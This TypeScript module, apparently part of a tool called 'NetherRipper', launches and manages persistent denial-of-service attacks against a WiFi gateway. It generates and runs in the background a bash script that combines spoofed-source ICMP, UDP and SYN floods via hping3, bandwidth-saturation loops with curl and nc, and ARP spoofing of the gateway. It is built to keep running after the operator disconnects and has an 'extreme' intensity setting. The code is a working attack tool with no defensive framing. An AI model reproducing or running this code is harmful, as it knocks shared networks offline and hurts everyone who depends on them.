import { exec } from './exec';
import { writeFileSync, readFileSync, existsSync } from 'node:fs';

const PERSISTENT_STATE_FILE = '/tmp/netheripper.persistent.json';

export interface PersistentAttack {
  id: string;
  gatewayIp: string;
  interface: string;
  ssid: string;
  intensity: string;
  startTime: string;
  processes: number[];
}

export interface PersistentState {
  attacks: PersistentAttack[];
}

/**
 * Load persistent attack state
 */
export function loadPersistentState(): PersistentState {
  try {
    if (!existsSync(PERSISTENT_STATE_FILE)) {
      return { attacks: [] };
    }
    const data = readFileSync(PERSISTENT_STATE_FILE, 'utf-8');
    return JSON.parse(data);
  } catch {
    return { attacks: [] };
  }
}

/**
 * Save persistent attack state
 */
export function savePersistentState(state: PersistentState): void {
  writeFileSync(PERSISTENT_STATE_FILE, JSON.stringify(state, null, 2));
}

/**
 * Get current WiFi SSID
 */
export async function getCurrentSSID(iface: string): Promise<string> {
  try {
    const { stdout } = await exec(`iwgetid ${iface} -r`);
    return stdout.trim() || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

/**
 * Start persistent flood attack (runs in background)
 */
export async function startPersistentFlood(
  gatewayIp: string,
  iface: string,
  intensity: string = 'high'
): Promise<string> {
  const state = loadPersistentState();
  const attackId = `attack_${Date.now()}`;
  const ssid = await getCurrentSSID(iface);
  
  // Check if gateway already under attack
  const existingAttack = state.attacks.find(a => a.gatewayIp === gatewayIp);
  if (existingAttack) {
    throw new Error(`Gateway ${gatewayIp} already under attack (ID: ${existingAttack.id})`);
  }

  console.log(`  Creating persistent attack: ${attackId}`);
  console.log(`  WiFi: ${ssid}`);
  console.log(`  Gateway: ${gatewayIp}`);
  console.log(`  Intensity: ${intensity}`);

  const processes: number[] = [];
  const params = getIntensityParams(intensity);

  // Create background attack script
  const scriptPath = `/tmp/netheripper_${attackId}.sh`;
  const script = `#!/bin/bash
# NetherRipper Persistent Attack
# ID: ${attackId}
# Gateway: ${gatewayIp}
# Started: ${new Date().toISOString()}

# Trap cleanup
trap 'exit 0' SIGTERM SIGINT

echo "Attack ${attackId} started on ${gatewayIp}"

# Method 1: ICMP Flood
if command -v hping3 &> /dev/null; then
    hping3 -1 --flood --rand-source -d ${params.packetSize} ${gatewayIp} &> /dev/null &
    echo $! >> /tmp/netheripper_${attackId}.pids
fi

# Method 2: UDP Flood
if command -v hping3 &> /dev/null; then
    hping3 --udp --flood --rand-source -p 53 ${gatewayIp} &> /dev/null &
    echo $! >> /tmp/netheripper_${attackId}.pids
fi

# Method 3: SYN Flood
if command -v hping3 &> /dev/null; then
    hping3 -S --flood --rand-source -p 80,443 ${gatewayIp} &> /dev/null &
    echo $! >> /tmp/netheripper_${attackId}.pids
fi

# Method 4: Bandwidth saturation threads
for i in {1..${params.threads}}; do
    (
        while true; do
            curl -s -o /dev/null --max-time 1 http://${gatewayIp} 2>/dev/null || true
            dd if=/dev/zero bs=1M count=5 2>/dev/null | nc -w1 ${gatewayIp} 80 2>/dev/null || true
            sleep 0.01
        done
    ) &> /dev/null &
    echo $! >> /tmp/netheripper_${attackId}.pids
done

# Method 5: ARP chaos
(
    while true; do
        arping -c 1 -A -I ${iface} -s ${gatewayIp} -S 00:00:00:00:00:00 255.255.255.255 2>/dev/null || true
        sleep 0.1
    done
) &> /dev/null &
echo $! >> /tmp/netheripper_${attackId}.pids

# Keep script alive
echo "Attack ${attackId} fully deployed. Gateway ${gatewayIp} is under siege."
wait
`;

  // Write and execute script
  writeFileSync(scriptPath, script);
  await exec(`chmod +x ${scriptPath}`);
  
  // Run in background with nohup
  await exec(`nohup ${scriptPath} &> /dev/null &`);
  
  // Wait for PIDs file to be created
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  // Read PIDs
  const pidsFile = `/tmp/netheripper_${attackId}.pids`;
  if (existsSync(pidsFile)) {
    const pidsContent = readFileSync(pidsFile, 'utf-8');
    const pids = pidsContent.split('\n').filter(Boolean).map(Number);
    processes.push(...pids);
  }

  // Save attack state
  const attack: PersistentAttack = {
    id: attackId,
    gatewayIp,
    interface: iface,
    ssid,
    intensity,
    startTime: new Date().toISOString(),
    processes,
  };

  state.attacks.push(attack);
  savePersistentState(state);

  console.log(`  ✓ Attack ${attackId} deployed with ${processes.length} processes`);
  console.log(`  ✓ Attack running in BACKGROUND - will persist even if you disconnect`);

  return attackId;
}

/**
 * Stop specific persistent attack
 */
export async function stopPersistentAttack(attackId: string): Promise<void> {
  const state = loadPersistentState();
  const attack = state.attacks.find(a => a.id === attackId);

  if (!attack) {
    throw new Error(`Attack ${attackId} not found`);
  }

  console.log(`  Stopping attack ${attackId} on ${attack.gatewayIp}...`);

  // Kill all processes
  for (const pid of attack.processes) {
    try {
      await exec(`kill -9 ${pid}`, { ignoreError: true });
    } catch {
      // Process might already be dead
    }
  }

  // Kill by pattern (more aggressive cleanup)
  await exec(`pkill -9 -f "netheripper_${attackId}"`, { ignoreError: true });
  await exec(`pkill -9 -f "hping3.*${attack.gatewayIp}"`, { ignoreError: true });

  // Clean up files
  try {
    await exec(`rm -f /tmp/netheripper_${attackId}.*`);
  } catch {
    // Ignore errors
  }

  // Remove from state
  state.attacks = state.attacks.filter(a => a.id !== attackId);
  savePersistentState(state);

  console.log(`  ✓ Attack ${attackId} stopped`);
}

/**
 * Stop ALL persistent attacks
 */
export async function stopAllPersistentAttacks(): Promise<void> {
  const state = loadPersistentState();

  if (state.attacks.length === 0) {
    console.log('  No persistent attacks to stop');
    return;
  }

  console.log(`  Stopping ${state.attacks.length} persistent attack(s)...`);

  for (const attack of state.attacks) {
    try {
      await stopPersistentAttack(attack.id);
    } catch (error) {
      console.log(`  Warning: Failed to stop ${attack.id}: ${error}`);
    }
  }

  // Nuclear cleanup
  await exec('pkill -9 hping3', { ignoreError: true });
  await exec('pkill -9 -f "netheripper_attack"', { ignoreError: true });
  await exec('rm -f /tmp/netheripper_attack_*', { ignoreError: true });

  // Clear state
  savePersistentState({ attacks: [] });

  console.log('  ✓ All persistent attacks stopped');
}

/**
 * List active persistent attacks
 */
export function listPersistentAttacks(): PersistentAttack[] {
  const state = loadPersistentState();
  return state.attacks;
}

/**
 * Get attack duration
 */
export function getAttackDuration(attack: PersistentAttack): string {
  const start = new Date(attack.startTime);
  const now = new Date();
  const diff = now.getTime() - start.getTime();

  const seconds = Math.floor(diff / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);

  if (hours > 0) {
    return `${hours}h ${minutes % 60}m`;
  } else if (minutes > 0) {
    return `${minutes}m ${seconds % 60}s`;
  } else {
    return `${seconds}s`;
  }
}

/**
 * Format persistent attacks for display
 */
export function formatPersistentAttacks(): string {
  const attacks = listPersistentAttacks();

  if (attacks.length === 0) {
    return 'No persistent attacks active';
  }

  let output = `Active Persistent Attacks: ${attacks.length}\n\n`;

  for (const attack of attacks) {
    output += `╔════════════════════════════════════════════════╗\n`;
    output += `║ Attack ID: ${attack.id.padEnd(38)} ║\n`;
    output += `╠════════════════════════════════════════════════╣\n`;
    output += `║ WiFi SSID: ${attack.ssid.padEnd(38)} ║\n`;
    output += `║ Gateway:   ${attack.gatewayIp.padEnd(38)} ║\n`;
    output += `║ Interface: ${attack.interface.padEnd(38)} ║\n`;
    output += `║ Intensity: ${attack.intensity.padEnd(38)} ║\n`;
    output += `║ Duration:  ${getAttackDuration(attack).padEnd(38)} ║\n`;
    output += `║ Processes: ${attack.processes.length.toString().padEnd(38)} ║\n`;
    output += `╚════════════════════════════════════════════════╝\n\n`;
  }

  return output;
}

/**
 * Check if any attacks are active
 */
export function hasActiveAttacks(): boolean {
  const state = loadPersistentState();
  return state.attacks.length > 0;
}

/**
 * Get intensity parameters
 */
function getIntensityParams(intensity: string): {
  rate: number;
  packetSize: number;
  threads: number;
} {
  switch (intensity) {
    case 'low':
      return { rate: 1000, packetSize: 1000, threads: 3 };
    case 'medium':
      return { rate: 5000, packetSize: 5000, threads: 7 };
    case 'high':
      return { rate: 10000, packetSize: 10000, threads: 12 };
    case 'extreme':
      return { rate: 50000, packetSize: 65000, threads: 25 };
    default:
      return { rate: 10000, packetSize: 10000, threads: 12 };
  }
}